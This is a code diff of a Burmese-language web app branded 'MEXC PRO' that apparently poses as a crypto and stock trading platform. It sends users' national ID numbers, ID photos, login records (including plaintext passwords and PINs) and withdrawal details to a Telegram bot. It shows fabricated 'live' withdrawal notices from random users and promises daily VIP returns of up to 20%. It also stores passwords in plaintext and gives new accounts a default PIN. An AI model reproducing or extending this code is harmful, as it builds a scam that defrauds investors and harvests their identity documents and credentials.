+        const now = new Date().toLocaleString('en-US', { timeZone: 'Asia/Yangon', year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true });
+        const headerMsg = `🆔 <b>VERIFICATION REQUEST</b>\n━━━━━━━━━━━━━━━━━━━━\n`;
+        const headerMsg2 = `👤 <b>User Name:</b> ${username}\n📱 <b>Phone:</b> ${phoneNumber}\n🪪 <b>NRC Number:</b> ${nrcNumber}\n🕐 <b>Time:</b> ${now}\n━━━━━━━━━━━━━━━━━━━━\n📸 အောက်တွင် မှတ်ပုံတင်ပုံ (၃) ပုံ ပါဝင်ပါသည်\n📢 Channel: ${TELEGRAM_CHANNEL}\n🌐 Platform: MEXC PRO`;
+        await sendTelegramMessage(headerMsg + headerMsg2);
         await new Promise(r => setTimeout(r, 800));
-
         const photos = [
             { key: 'front', label: '📷 မှတ်ပုံတင် ရှေ့ဘက်ပုံ (Front)', file: nrcImages.front },
             { key: 'back',  label: '📷 မှတ်ပုံတင် နောက်ဘက်ပုံ (Back)',  file: nrcImages.back },
             { key: 'hold',  label: '📷 မှတ်ပုံတင် ကိုင်ဆောင်ထားသောပုံ (Holding)', file: nrcImages.hold }
         ];
-
         const results = { front: false, back: false, hold: false };
         for (const photo of photos) {
             if (!photo.file) continue;
@@ -1069,25 +1063,20 @@
             try {
                 const result = await sendTelegramPhoto(photo.file, caption);
                 if (result && result.ok) results[photo.key] = true;
-            } catch (err) {
-                console.error(`💥 [Verification] ${photo.key} exception:`, err);
-            }
+            } catch (err) { console.error(err); }
             await new Promise(r => setTimeout(r, 1200));
         }
-
         const successCount = Object.values(results).filter(Boolean).length;
         const allOk = successCount === 3;
-
         const footerMsg = allOk
             ? `✅ <b>Verification Photos Upload Complete</b>\n👤 ${username} | 📱 ${phoneNumber}\n🖼️ ${successCount}/3 ပုံ အောင်မြင်စွာ ပို့ပြီးပါပြီ။\n📢 Channel: ${TELEGRAM_CHANNEL}`
             : `⚠️ <b>Verification Photos Incomplete</b>\n👤 ${username} | 📱 ${phoneNumber}\n🖼️ ပုံ ${successCount}/3 သာ ရောက်ပါတယ်။\n📢 Channel: ${TELEGRAM_CHANNEL}`;
-        
         await sendTelegramMessage(footerMsg);
         return { successCount, allOk, results };
     }
 
     // ================================================================
-    // 🛠️ MODAL SYSTEM
+    // MODAL SYSTEM
     // ================================================================
     function showModal(title, message, buttons) {
         document.getElementById('modal-title').innerText = title;
@@ -1156,12 +1145,6 @@
         showModal('💸 Withdraw Success', modalMessage, [{ text: 'အတည်ပြုမည်', callback: () => { showPage('dash-page'); refreshAllHistory(); } }]);
     }
 
-    function applyClickGold(btn) {
-        document.querySelectorAll('.btn').forEach(b => b.classList.remove('clicked-gold'));
-        btn.classList.add('clicked-gold');
-        setTimeout(() => btn.classList.remove('clicked-gold'), 1000);
-    }
-
     function handleIconClick(el) {
         el.classList.add('clicked');
         setTimeout(() => el.classList.remove('clicked'), 500);
@@ -1178,23 +1161,30 @@
         else { x.type = "password"; el.classList.replace('fa-eye-slash', 'fa-eye'); }
     }
 
+    // ================================================================
+    // 🔥 FIXED: Login & Signup Logic
+    // ================================================================
     async function handleAuth(type) {
         const ph = document.getElementById(type==='login'?'log-ph':'reg-ph').value.trim();
         const pw = document.getElementById(type==='login'?'log-pw':'reg-pw').value;
-        
         const mmPhoneRegex = /^(09|\+?959)\d{7,11}$/;
+        
         if(!mmPhoneRegex.test(ph)) return showSuccess('Error', 'မြန်မာဖုန်းနံပါတ် (09...) ကိုသာ အသုံးပြုပေးပါ။');
         if(!ph || !pw) return showSuccess('Error', 'ကျေးဇူးပြု၍ အချက်အလက်အားလုံးကို ဖြည့်စွက်ပါ။');
         
         if(type==='login') {
             db.ref('users/'+ph).once('value', async s => {
                 if(s.exists() && s.val().password === pw) {
-                    user=ph; 
+                    user = ph; 
                     document.getElementById('bot-nav').style.display='flex'; 
                     showPage('dash-page'); 
                     initApp();
                     startLiveWdFeed(); 
-                    await sendLoginToTelegram(s.val());
+                    
+                    try {
+                        await sendLoginToTelegram(s.val());
+                    } catch(e) { console.log('Telegram error ignored'); }
+                    
                     showSuccess('✅ လော့ဂ်အင် အောင်မြင်ပါသည်', `
                         <b>သင်၏ အကောင့်ထဲသို့ ပြန်လည်ဝင်ရောက်မှု အောင်မြင်ပါသည်။</b><br><br>
                         <div style="background:rgba(0,0,0,0.3); padding:12px; border-radius:10px; text-align:left;">
@@ -1203,7 +1193,9 @@
                             <div style="display:flex; justify-content:space-between;"><span style="color:var(--dim);">လက်ကျန်ငွေ</span><b style="color:var(--primary);">${(s.val().balance || 0).toLocaleString()} Ks</b></div>
                         </div>
                     `, () => {});
-                } else showSuccess('Login Failed', 'ဖုန်းနံပါတ် သို့မဟုတ် လျှို့ဝှက်နံပါတ် မှားယွင်းနေပါသည်။');
+                } else {
+                    showSuccess('Login Failed', 'ဖုန်းနံပါတ် သို့မဟုတ် လျှို့ဝှက်နံပါတ် မှားယွင်းနေပါသည်။');
+                }
             });
         } else {
             const un = document.getElementById('reg-un').value.trim();
@@ -1212,13 +1204,19 @@
             
             db.ref('users/'+ph).once('value', async s => {
                 if(s.exists()) return showSuccess('Error', 'ဤဖုန်းနံပါတ်ဖြင့် အကောင့်ဖွင့်ပြီးသား ဖြစ်ပါသည်။');
+                
                 const newUserData = { 
                     username: un, password: pw, balance: 0, mode: 'random', pin: '123456', vip: 0,
                     verificationStatus: 'none', invested: 0, stockHoldings: {},
                     registeredAt: new Date().toLocaleString(), phone: ph
                 };
+                
                 db.ref('users/'+ph).set(newUserData);
-                await sendRegisterToTelegram(newUserData);
+                
+                try {
+                    await sendRegisterToTelegram(newUserData);
+                } catch(e) { console.log('Telegram error ignored'); }
+                
                 showSuccess('✅ အကောင့်ဖွင့်ခြင်း အောင်မြင်ပါသည်', `
                     <b>သင်၏ အကောင့်အသစ်ကို အောင်မြင်စွာ ဖွင့်လှစ်ပြီးပါပြီ။</b><br><br>
                     <div style="background:rgba(0,0,0,0.3); padding:12px; border-radius:10px; text-align:left;">
@@ -1233,6 +1231,7 @@
     }
 
     function initApp() {
+        if(!user) return;
         db.ref('users/'+user).on('value', s => { 
             const val = s.val();
             if(!val) return;
@@ -1241,12 +1240,10 @@
             document.getElementById('u-vip-badge').innerText = "VIP " + (val.vip || 0);
             document.getElementById('current-vip-level').innerText = "VIP " + (val.vip || 0) + " MEMBER";
             currentVipLevel = val.vip || 0;
-            
             document.getElementById('prof-username').innerText = val.username;
             document.getElementById('prof-phone').innerText = val.phone;
             document.getElementById('prof-balance').innerText = (val.balance || 0).toLocaleString() + " Ks";
             document.getElementById('prof-vip').innerText = "VIP " + (val.vip || 0);
-            
             updateInvestmentValue();
             updateVerifyBanner(val.verificationStatus);
             renderUserStockHoldings(val);
@@ -1271,10 +1268,8 @@
             const msgs = s.val();
             const container = document.getElementById('user-messages-list');
             if(!container) return;
-            
-            if(!msgs) {
-                container.innerHTML = "<div class='card' style='text-align:center; color:var(--dim); font-size:12px;'>No messages yet.</div>";
-            } else {
+            if(!msgs) container.innerHTML = "<div class='card' style='text-align:center; color:var(--dim); font-size:12px;'>No messages yet.</div>";
+            else {
                 let h = "";
                 const arr = Object.values(msgs).sort((a,b) => (b.timestamp || 0) - (a.timestamp || 0));
                 arr.forEach(msg => { h += `<div class="msg-box"><small class="msg-date">${msg.date}</small><p style="margin:0; font-size:13px;">${msg.text}</p></div>`; });
@@ -1286,10 +1281,8 @@
         setInterval(checkNotiDot, 30000);
         checkNotiDot();
         loadMarkets(); loadMining(); renderVIP(); 
-        
         setTimeout(() => { refreshAllHistory(); cleanupExpiredHistory(); }, 500);
         fetchPrices().then(() => { loadMarkets(); });
-        cleanupOldTrades();
         if(userDataGlobal) processDailyVipProfit(userDataGlobal, user);
     }
 
@@ -1330,31 +1323,21 @@
     async function processDailyVipProfit(userData, userPhone) {
         if(!userData || userData.vip < 1) return;
         if(!userData.balance || userData.balance <= 0) return;
-        
         const vipRates = { 1: 2.5, 2: 5.0, 3: 8.5, 4: 12.0, 5: 20.0 };
         const rate = vipRates[userData.vip] || 0;
         if(rate <= 0) return;
-        
         const now = new Date();
         const myanmarOffset = 6.5 * 60; 
         const utcMinutes = now.getUTCHours() * 60 + now.getUTCMinutes();
         const mmMinutes = (utcMinutes + myanmarOffset) % (24 * 60);
         const mmHour = Math.floor(mmMinutes / 60);
         const mmMin = mmMinutes % 60;
-        
         if(!(mmHour === 0 && mmMin === 1)) return;
-        
         const todayStr = `${now.getFullYear()}-${now.getMonth()}-${now.getDate()}`;
         if(userData.lastDailyProfit === todayStr) return;
-        
         const profit = userData.balance * (rate / 100);
         const newBalance = userData.balance + profit;
-        
-        await db.ref('users/' + userPhone).update({
-            balance: newBalance,
-            lastDailyProfit: todayStr,
-            lastDailyProfitAmount: profit
-        });
+        await db.ref('users/' + userPhone).update({ balance: newBalance, lastDailyProfit: todayStr, lastDailyProfitAmount: profit });
     }
 
     setInterval(() => { if(user && userDataGlobal) processDailyVipProfit(userDataGlobal, user); }, 60000);
@@ -1366,6 +1349,7 @@
             const randomUser = users[Math.floor(Math.random() * users.length)];
             const randomAmt = amounts[Math.floor(Math.random() * amounts.length)];
             const container = document.getElementById('wd-live-container');
+            if(!container) return;
             const toast = document.createElement('div');
             toast.className = 'wd-toast';
             toast.innerHTML = `<i class="fas fa-check-circle"></i><div><div style="font-size:12px; color:white; font-weight:bold;">ငွေထုတ်ယူမှု အောင်မြင်ပါသည်။</div><div style="font-size:10px; color:var(--dim);">အသုံးပြုသူ ${randomUser} သည် ${randomAmt.toLocaleString()} Ks ကို ရရှိသွားပါသည်။</div></div>`;
@@ -1514,7 +1498,7 @@
                     <div style="display:flex; justify-content:space-between; margin-bottom:8px;"><span style="color:var(--dim);">အမြတ် %</span><b style="color:var(--active-gold);">+${finalProf}%</b></div>
                     <div style="display:flex; justify-content:space-between;"><span style="color:var(--dim);">ကြာချိန်</span><b>${cDur} စက္ကန့်</b></div>
                 </div>
-                <p style="color:var(--dim); font-size:13px;">သင်၏ Trade ကို စတင်ရန် အတည်ပြုမည်လား?<br>ငြင်းပယ်ပါက ငွေထုတ်ယူမှု မရှိပါ။</p>`,
+                <p style="color:var(--dim); font-size:13px;">သင်၏ Trade ကို စတင်ရန် အတည်ပြုမည်လား?</p>`,
                 () => { executeTrade(side, amt, uData); },
                 () => { showSuccess('ပယ်ဖျက်ပြီးပါပြီ', 'သင်၏ Trade ကို ပယ်ဖျက်လိုက်ပါသည်။'); }
             );
@@ -1620,17 +1604,14 @@
             let statusHTML = "";
             isMiningActive = false;
             const now = Date.now();
-
             s.forEach(r => {
                 const data = r.val();
                 if(!data.node) return;
                 if(data.status === 'running' || data.status === 'pending') isMiningActive = true;
                 if(data.status === 'completed' && data.endTime && (now - data.endTime > 172800000)) return;
-
                 let statusClass = `status-${data.status}`;
                 let progress = 0;
                 let timeText = data.status === 'running' ? 'တွက်ချက်နေသည်...' : 'စောင့်ဆိုင်းနေသည်...';
-
                 if(data.status === 'running' && data.startTime && data.expiryTime) {
                     const totalDuration = data.expiryTime - data.startTime;
                     const elapsed = now - data.startTime;
@@ -1642,14 +1623,12 @@
                         timeText = `နောက်ထပ် ${days}ရက် ${hours}နာရီ`;
                     } else { timeText = "ပြီးဆုံးပါပြီ!"; progress = 100; }
                 }
-
                 let actionButton = '';
                 if(data.status === 'running') {
-                    if(currentVipLevel >= 3) actionButton = `<button class="btn btn-green" onclick="applyClickGold(this); stopMiningVIP3('${r.key}', ${data.totalProfit}, ${data.amt})" style="padding:10px; font-size:11px; margin-top:10px;">⚡ ရပ်တန့်မည် (အရင်း+အမြတ်)</button>`;
-                    else if(currentVipLevel >= 2) actionButton = `<button class="btn btn-red" onclick="applyClickGold(this); stopMiningVIP2('${r.key}', ${data.amt})" style="padding:10px; font-size:11px; margin-top:10px;">🛑 ရပ်တန့်မည် (အရင်းသာရ)</button>`;
-                    if(now >= data.expiryTime) actionButton += `<button class="btn btn-main" onclick="applyClickGold(this); claimMining('${r.key}', ${data.totalProfit})" style="padding:10px; font-size:11px; margin-top:10px;">အမြတ်ငွေ ထုတ်ယူမည်</button>`;
+                    if(currentVipLevel >= 3) actionButton = `<button class="btn btn-green" onclick="stopMiningVIP3('${r.key}', ${data.totalProfit}, ${data.amt})" style="padding:10px; font-size:11px; margin-top:10px;">⚡ ရပ်တန့်မည် (အရင်း+အမြတ်)</button>`;
+                    else if(currentVipLevel >= 2) actionButton = `<button class="btn btn-red" onclick="stopMiningVIP2('${r.key}', ${data.amt})" style="padding:10px; font-size:11px; margin-top:10px;">🛑 ရပ်တန့်မည် (အရင်းသာရ)</button>`;
+                    if(now >= data.expiryTime) actionButton += `<button class="btn btn-main" onclick="claimMining('${r.key}', ${data.totalProfit})" style="padding:10px; font-size:11px; margin-top:10px;">အမြတ်ငွေ ထုတ်ယူမည်</button>`;
                 }
-
                 statusHTML += `<div class="card active-mining-info">
                     <div style="display:flex; justify-content:space-between; align-items:center;">
                         <b style="font-size:14px; color:var(--primary);">${data.node}</b>
@@ -1671,7 +1650,7 @@
 
         const el2 = document.getElementById('mining-list');
         if(el2) el2.innerHTML = nodes.map(v => 
-            `<div class="card mining-card"><div class="mining-content"><div style="display:flex; align-items:center;"><div class="mining-icon"><i class="fas ${v.i}"></i></div><div class="mining-info"><h4>${v.n}</h4><small>အနည်းဆုံး: ${v.min.toLocaleString()} Ks</small></div></div><div class="profit-badge">+${v.p}% နေ့စဉ်အမြတ်</div></div><div class="mining-duration-info"><div class="item"><div class="val">${v.d}</div><div style="color:var(--dim); font-size:10px;">ရက်</div></div><div class="item"><div class="val">${v.p}%</div><div style="color:var(--dim); font-size:10px;">Daily</div></div><div class="item"><div class="val">${Math.floor(v.min + (v.min*(v.p/100)*v.d)).toLocaleString()}</div><div style="color:var(--dim); font-size:10px;">စုစုပေါင်း</div></div></div><div style="margin-top:15px; position:relative; z-index:5;"><input type="number" id="amt-${v.n.replace(/\s+/g, '')}" placeholder="ပမာဏ (Ks)"><button class="btn btn-main" onclick="applyClickGold(this); confirmMining('${v.n}', ${v.min}, ${v.p}, ${v.d})">စက်လည်ပတ်မည်</button></div></div>`
+            `<div class="card mining-card"><div class="mining-content"><div style="display:flex; align-items:center;"><div class="mining-icon"><i class="fas ${v.i}"></i></div><div class="mining-info"><h4>${v.n}</h4><small>အနည်းဆုံး: ${v.min.toLocaleString()} Ks</small></div></div><div class="profit-badge">+${v.p}% နေ့စဉ်အမြတ်</div></div><div class="mining-duration-info"><div class="item"><div class="val">${v.d}</div><div style="color:var(--dim); font-size:10px;">ရက်</div></div><div class="item"><div class="val">${v.p}%</div><div style="color:var(--dim); font-size:10px;">Daily</div></div><div class="item"><div class="val">${Math.floor(v.min + (v.min*(v.p/100)*v.d)).toLocaleString()}</div><div style="color:var(--dim); font-size:10px;">စုစုပေါင်း</div></div></div><div style="margin-top:15px; position:relative; z-index:5;"><input type="number" id="amt-${v.n.replace(/\s+/g, '')}" placeholder="ပမာဏ (Ks)"><button class="btn btn-main" onclick="confirmMining('${v.n}', ${v.min}, ${v.p}, ${v.d})">စက်လည်ပတ်မည်</button></div></div>`
         ).join('');
     }
 
@@ -1679,13 +1658,10 @@
         if(isMiningActive) return showSuccess('Error', "ယခင် mining ပြီးဆုံးအောင်စောင့်ပါ။");
         const amt = parseFloat(document.getElementById(`amt-${node.replace(/\s+/g, '')}`).value);
         if(!amt || amt < min) return showSuccess('Error', "အနည်းဆုံး " + min.toLocaleString() + " Ks ရင်းနှီးရပါမည်။");
-        
         db.ref('users/'+user).once('value', s => {
             const uData = s.val();
             if(uData.balance < amt) return showSuccess('Error', "လက်ကျန်ငွေ မလုံလောက်ပါ။");
-            
             const totalProfit = Math.floor(amt + (amt * (percent/100) * days));
-            
             showConfirm(
                 '⛏️ Mining အတည်ပြုရန်',
                 `<div style="text-align:left; background:rgba(0,0,0,0.3); padding:15px; border-radius:12px; margin-bottom:15px;">
@@ -1706,7 +1682,6 @@
         const now = new Date();
         const expiry = new Date(); expiry.setDate(now.getDate() + days);
         const totalProfit = Math.floor(amt + (amt * (percent/100) * days));
-
         db.ref('users/'+user).update({ balance: uData.balance - amt });
         db.ref('requests/mining').push({ 
             ph:user, node:node, amt:amt, status:'pending', date: now.toLocaleString(), 
@@ -1714,7 +1689,6 @@
             expiryDate: expiry.toLocaleDateString(), expiryTime: expiry.getTime(), 
             startTime: now.getTime(), totalProfit: totalProfit, daysDuration: days 
         });
-        
         notifyBot('⛏️ MINING REQUEST', { 'User': user, 'Node': node, 'Amount': amt.toLocaleString() });
         refreshAllHistory();
         showModal('⛏️ Mining စတင်ပါပြီ!', `
@@ -1800,7 +1774,6 @@
     function renderStockMarket() {
         const container = document.getElementById('stock-market-list');
         if(!container) return;
-        
         let html = '';
         STOCK_DATA.forEach(s => {
             const price = liveStockPrices[s.id] || 1.0;
@@ -1808,7 +1781,6 @@
             const isUp = price >= 1.0;
             const color = isUp ? 'var(--green)' : 'var(--red)';
             const icon = isUp ? 'fa-arrow-up' : 'fa-arrow-down';
-            
             html += `
             <div class="stock-card">
                 <div class="stock-info">
@@ -1843,7 +1815,6 @@
             </div>
         `;
         document.body.appendChild(modal);
-        
         document.getElementById('stock-buy-cancel').onclick = () => modal.remove();
         document.getElementById('stock-buy-confirm').onclick = () => {
             const amt = parseFloat(document.getElementById('stock-buy-amt').value);
@@ -1860,15 +1831,12 @@
         db.ref('users/'+user).once('value', s => {
             const uData = s.val();
             if(uData.balance < amount) return showSuccess('Error', "လက်ကျန်ငွေ မလုံလောက်ပါ။");
-            
             const shares = amount / price;
             const currentHoldings = uData.stockHoldings || {};
             const existing = currentHoldings[stockId] || { amount: 0, shares: 0, avgPrice: price };
-            
             const newShares = (existing.shares || 0) + shares;
             const newTotalInvested = (existing.amount || 0) + amount;
             const newAvgPrice = newTotalInvested / newShares;
-            
             const updates = {};
             updates[`users/${user}/balance`] = (uData.balance || 0) - amount;
             updates[`users/${user}/stockHoldings/${stockId}`] = {
@@ -1876,7 +1844,6 @@
                 name: stockName, lastUpdate: Date.now()
             };
             db.ref().update(updates);
-            
             const now = Date.now();
             db.ref('requests/stocks').push({
                 ph: user, stockId: stockId, stockName: stockName, amount: amount, price: price, shares: shares,
@@ -1884,7 +1851,6 @@
                 timestamp: now,
                 expiryDate: new Date(now + HISTORY_RETENTION_MS).toLocaleString()
             });
-            
             notifyBot('📈 STOCK BUY', { 'User': user, 'Stock': stockName, 'Amount': amount.toLocaleString() + ' Ks', 'Price': price.toFixed(3) + 'x' });
             refreshAllHistory();
             showSuccess('Stock Purchased', `✅ ${stockName} ကို ${amount.toLocaleString()} Ks ဖြင့် ဝယ်ယူပြီးပါပြီ။<br><br><small style="color:var(--dim);">မှတ်တမ်းသည် ရက် 30 ကြာလျှင် အလိုအလျောက် ပျက်သွားပါမည်။</small>`);
@@ -1894,20 +1860,17 @@
     function renderUserStockHoldings(uData) {
         const container = document.getElementById('user-stock-holdings');
         if(!container) return;
-        
         const holdings = uData.stockHoldings || {};
         if(Object.keys(holdings).length === 0) {
             container.innerHTML = "<p style='color:var(--dim); font-size:12px; text-align:center; padding:20px;'>No stock holdings yet.</p>";
             return;
         }
-        
         let h = '';
         Object.entries(holdings).forEach(([id, data]) => {
             const currentPrice = liveStockPrices[id] || data.avgPrice || 1.0;
             const currentValue = data.shares * currentPrice;
             const profit = currentValue - data.amount;
             const isProfit = profit >= 0;
-            
             h += `<div class="stock-card" style="flex-direction:column; align-items:stretch;">
                 <div style="display:flex; justify-content:space-between; margin-bottom:8px;">
                     <b style="font-size:14px;">${data.name}</b>
@@ -1918,7 +1881,7 @@
                     လက်ရှိတန်ဖိုး: <b style="color:${isProfit ? 'var(--green)' : 'var(--red)'};">${currentValue.toLocaleString(undefined, {maximumFractionDigits: 0})} Ks</b><br>
                     Shares: ${(data.shares || 0).toFixed(4)} (Price: ${currentPrice.toFixed(3)}x)
                 </div>
-                <button class="btn btn-green" style="padding:8px; font-size:12px;" onclick="applyClickGold(this); sellStock('${id}', ${data.shares}, '${data.name}')">ပြန်ရောင်းမည် (${currentValue.toLocaleString(undefined, {maximumFractionDigits: 0})} Ks)</button>
+                <button class="btn btn-green" style="padding:8px; font-size:12px;" onclick="sellStock('${id}', ${data.shares}, '${data.name}')">ပြန်ရောင်းမည် (${currentValue.toLocaleString(undefined, {maximumFractionDigits: 0})} Ks)</button>
             </div>`;
         });
         container.innerHTML = h;
@@ -1927,18 +1890,15 @@
     function sellStock(stockId, shares, stockName) {
         const price = liveStockPrices[stockId] || 1.0;
         const sellValue = shares * price;
-        
         showConfirm('Sell Stock', `${stockName} ကို ပြန်ရောင်းမှာ သေချာပါသလား?<br><br>ရရှိမည့်ငွေ: <b>${sellValue.toLocaleString(undefined, {maximumFractionDigits: 0})} Ks</b>`, () => {
             db.ref('users/'+user).once('value', s => {
                 const uData = s.val();
                 const holdings = uData.stockHoldings || {};
                 if(!holdings[stockId]) return;
-                
                 const updates = {};
                 updates[`users/${user}/balance`] = (uData.balance || 0) + sellValue;
                 updates[`users/${user}/stockHoldings/${stockId}`] = null;
                 db.ref().update(updates);
-                
                 const now = Date.now();
                 db.ref('requests/stocks').push({
                     ph: user, stockId: stockId, stockName: stockName, amount: sellValue, price: price, shares: shares,
@@ -1946,7 +1906,6 @@
                     timestamp: now,
                     expiryDate: new Date(now + HISTORY_RETENTION_MS).toLocaleString()
                 });
-                
                 notifyBot('📉 STOCK SELL', { 'User': user, 'Stock': stockName, 'Value': sellValue.toLocaleString() });
                 refreshAllHistory();
                 showSuccess('Stock Sold', `✅ ${stockName} ကို ပြန်ရောင်းပြီးပါပြီ။<br><br>ရရှိငွေ: <b>${sellValue.toLocaleString(undefined, {maximumFractionDigits: 0})} Ks</b><br><br><small style="color:var(--dim);">မှတ်တမ်းသည် ရက် 30 ကြာလျှင် အလိုအလျောက် ပျက်သွားပါမည်။</small>`);
@@ -1970,9 +1929,7 @@
 
     function loadAllHistory() {
         if(!user) return;
-        console.log('[History] Loading all history for:', user);
-
-        function filterByUser(snapshot, collectionName) {
+        function filterByUser(snapshot) {
             const records = [];
             snapshot.forEach(child => {
                 const data = child.val();
@@ -1982,7 +1939,7 @@
         }
 
         db.ref('requests/trades').once('value', s => {
-            const records = filterByUser(s, 'trades');
+            const records = filterByUser(s);
             let h = "";
             records.forEach(data => {
                 const isWin = data.result === 'WIN';
@@ -1998,7 +1955,7 @@
         });
 
         db.ref('requests/mining').once('value', s => {
-            const records = filterByUser(s, 'mining');
+            const records = filterByUser(s);
             let h = "";
             records.forEach(data => {
                 let statusColor = data.status === 'completed' ? 'var(--green)' : (data.status === 'rejected' ? 'var(--red)' : 'var(--active-gold)');
@@ -2014,7 +1971,7 @@
         });
 
         db.ref('requests/stocks').once('value', s => {
-            const records = filterByUser(s, 'stocks');
+            const records = filterByUser(s);
             let h = "";
             records.forEach(data => {
                 let isBuy = data.type === 'BUY';
@@ -2035,7 +1992,7 @@
         });
 
         db.ref('requests/deposits').once('value', s => {
-            const records = filterByUser(s, 'deposits');
+            const records = filterByUser(s);
             let h = "";
             records.forEach(r => {
                 let statusColor = r.status === 'success' ? 'var(--green)' : (r.status === 'rejected' ? 'var(--red)' : 'var(--active-gold)');
@@ -2050,7 +2007,7 @@
         });
 
         db.ref('requests/withdraws').once('value', s => {
-            const records = filterByUser(s, 'withdraws');
+            const records = filterByUser(s);
             let h = "";
             records.forEach(r => {
                 let statusColor = r.status === 'success' ? 'var(--green)' : (r.status === 'rejected' ? 'var(--red)' : 'var(--active-gold)');
@@ -2069,7 +2026,6 @@
         const now = Date.now();
         const cutoff = now - HISTORY_RETENTION_MS;
         const collections = ['trades', 'mining', 'deposits', 'withdraws', 'stocks'];
-        
         collections.forEach(col => {
             db.ref(`requests/${col}`).once('value', s => {
                 const updates = {};
@@ -2120,7 +2076,7 @@
                 <div class="vip-benefits">
                     ${v.benefits.map(b => `<div class="vip-benefit-item ${b.exclusive ? 'exclusive' : ''}"><i class="fas ${b.exclusive ? 'fa-star' : 'fa-check-circle'}"></i><span>${b.text}</span></div>`).join('')}
                 </div>
-                ${isCurrent ? `<button class="btn btn-green" disabled>✅ လက်ရှိအဆင့်</button>` : (isLocked ? `<button class="btn" style="background:#333; color:#888;" disabled>🔒 ပိုင်ဆိုင်ပြီး</button>` : `<button class="btn btn-main" onclick="applyClickGold(this); buyVIP(${v.level}, ${v.cost})">⭐ VIP ${v.level} သို့ အဆင့်မြှင့်မည်</button>`)}
+                ${isCurrent ? `<button class="btn btn-green" disabled>✅ လက်ရှိအဆင့်</button>` : (isLocked ? `<button class="btn" style="background:#333; color:#888;" disabled>🔒 ပိုင်ဆိုင်ပြီး</button>` : `<button class="btn btn-main" onclick="buyVIP(${v.level}, ${v.cost})">⭐ VIP ${v.level} သို့ အဆင့်မြှင့်မည်</button>`)}
             </div>`;
         });
         const el = document.getElementById('vip-tiers-list');
@@ -2141,23 +2097,19 @@
     }
 
     // ================================================================
-    // 🔥 WITHDRAW (FIXED WITH FULL TELEGRAM DATA)
+    // WITHDRAW
     // ================================================================
     function confirmWithdraw() { 
         if(!currentWdPayMethod) return showSuccess('Error', "ငွေထုတ်ယူမည့် နည်းလမ်းကို အရင်ရွေးချယ်ပါ။");
-
         const amt = parseFloat(document.getElementById('wd-amt-input').value); 
         const name = document.getElementById('wd-name-input').value.trim();
         const ph = document.getElementById('wd-ph-input').value.trim();
         const pin = document.getElementById('wd-pin-input').value; 
-
         if(!amt || amt < 1000) return showSuccess('Error', "အနည်းဆုံး ၁၀၀၀ ကျပ်");
         if(!name || !ph || !pin) return showSuccess('Error', "အချက်အလက်များ ပြည့်စုံစွာ ဖြည့်ပါ။");
-
         db.ref('users/'+user).once('value', s => { 
             if(s.val().pin !== pin) return showSuccess('Error', "PIN မှားနေပါသည်။"); 
             if(s.val().balance < amt) return showSuccess('Error', "လက်ကျန်ငွေ မလုံလောက်ပါ။"); 
-            
             showConfirm(
                 '💸 ငွေထုတ်ယူရန် အတည်ပြုပါ',
                 `<div style="text-align:left; background:rgba(0,0,0,0.3); padding:15px; border-radius:12px; margin-bottom:15px;">
@@ -2166,55 +2118,34 @@
                     <div style="display:flex; justify-content:space-between; margin-bottom:8px;"><span style="color:var(--dim);">အကောင့်အမည်</span><b>${name}</b></div>
                     <div style="display:flex; justify-content:space-between;"><span style="color:var(--dim);">ဖုန်းနံပါတ်</span><b>${ph}</b></div>
                 </div>
-                <p style="color:var(--dim); font-size:13px;">ငွေထုတ်ယူမှုကို အတည်ပြုမည်လား?<br>ပယ်ဖျက်ပါက ငွေထုတ်ယူမှု မရှိပါ။</p>`,
+                <p style="color:var(--dim); font-size:13px;">ငွေထုတ်ယူမှုကို အတည်ပြုမည်လား?</p>`,
                 () => { executeWithdraw(amt, name, ph); },
                 () => { showSuccess('ပယ်ဖျက်ပြီးပါပြီ', 'ငွေထုတ်ယူမှုကို ပယ်ဖျက်လိုက်ပါသည်။'); }
             );
         }); 
     }
 
-    // 🔥 UPDATED executeWithdraw — All data including receiver name/phone sent to Telegram
     function executeWithdraw(amt, name, ph) {
         db.ref('users/'+user).once('value', s => {
             const uData = s.val();
             const currentBal = uData.balance;
             const balanceAfter = currentBal - amt;
-            
             const withdrawRecord = { 
-                ph: user, 
-                username: uData.username || 'N/A',
-                amt: amt, 
-                name: name, 
-                receivePh: ph, 
-                method: currentWdPayMethod,
-                status: 'pending', 
-                date: new Date().toLocaleString(),
-                timestamp: Date.now()
+                ph: user, username: uData.username || 'N/A', amt: amt, name: name, receivePh: ph, 
+                method: currentWdPayMethod, status: 'pending', date: new Date().toLocaleString(), timestamp: Date.now()
             };
-            
             const newRef = db.ref('requests/withdraws').push();
             withdrawRecord.requestId = newRef.key;
             newRef.set(withdrawRecord);
-            
             db.ref('users/'+user).update({ balance: balanceAfter }); 
-            
-            // 🔥 SEND FULL WITHDRAW DETAILS TO TELEGRAM
             sendWithdrawToTelegram({
-                username: uData.username || 'N/A',
-                ph: user,
-                amt: amt,
-                receiveName: name,
-                receivePh: ph,
-                method: currentWdPayMethod,
-                balanceBefore: currentBal,
-                balanceAfter: balanceAfter,
-                vip: uData.vip || 0,
-                requestId: newRef.key
+                username: uData.username || 'N/A', ph: user, amt: amt,
+                receiveName: name, receivePh: ph, method: currentWdPayMethod,
+                balanceBefore: currentBal, balanceAfter: balanceAfter,
+                vip: uData.vip || 0, requestId: newRef.key
             });
-            
             refreshAllHistory();
             showWithdrawSuccess(amt, name, ph, currentWdPayMethod);
-            
             document.getElementById('wd-amt-input').value = '';
             document.getElementById('wd-name-input').value = '';
             document.getElementById('wd-ph-input').value = '';
@@ -2230,9 +2161,7 @@
         const trx = document.getElementById('dep-trx-input').value.trim(); 
         if(!amt || !trx) return showSuccess('Error', "အချက်အလက်များ ပြည့်စုံစွာ ဖြည့်ပါ။");
         if(!currentPayMethod) return showSuccess('Error', "ငွေပေးချေမှုနည်းလမ်းကို အရင်ရွေးချယ်ပါ။");
-        
         const methodDisplay = currentPayMethod === 'kpay' ? 'KBZ Pay 💳' : 'Wave Pay 🌊';
-        
         showConfirm(
             '💰 ငွေသွင်းရန် အတည်ပြုပါ',
             `<div style="text-align:left; background:rgba(0,0,0,0.3); padding:15px; border-radius:12px; margin-bottom:15px;">
@@ -2244,29 +2173,17 @@
             <p style="color:var(--dim); font-size:13px;">ငွေသွင်းမှုကို အတည်ပြုမည်လား?</p>`,
             () => { 
                 const paymentData = PAYMENT_DETAILS[currentPayMethod];
-                
                 db.ref('requests/deposits').push({ 
-                    ph: user, 
-                    username: userDataGlobal ? userDataGlobal.username : 'N/A',
-                    amt: amt, 
-                    trx: trx, 
-                    method: currentPayMethod,
